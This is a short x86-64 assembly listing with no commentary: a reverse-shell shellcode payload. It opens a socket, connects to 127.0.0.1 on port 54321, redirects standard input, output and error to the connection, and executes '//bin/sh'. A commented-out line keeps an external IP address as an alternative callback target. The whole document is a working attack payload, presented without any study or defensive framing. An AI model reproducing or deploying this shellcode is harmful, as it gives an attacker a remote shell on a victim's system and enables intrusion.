    /*mov rdi,0x8f522a42  ip:66.42.82.143*/
    mov rdi,0x0100007f  /*ip:127.0.0;1*/
    push rdi
    pushw 0x31d4    /*port:54321*/
    pushw 2                                                  
    
    push 42                                 
    push 16                            
    push 41                            
    push 1                             
    push 2                            

    pop rdi                                
    pop rsi                                
    xor rdx, rdx                            
    pop rax                                 
    syscall

    mov rdi, rax                           
    pop rdx                                
    pop rax                                
    mov rsi, rsp                          
    syscall

    xor rsi, rsi
loop:
    mov al, 33
    syscall
    inc rsi
    cmp rsi, 2
    jle loop

    xor rax, rax
    mov rdi, 0x68732f6e69622f2f
    xor rsi, rsi
    push rsi
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
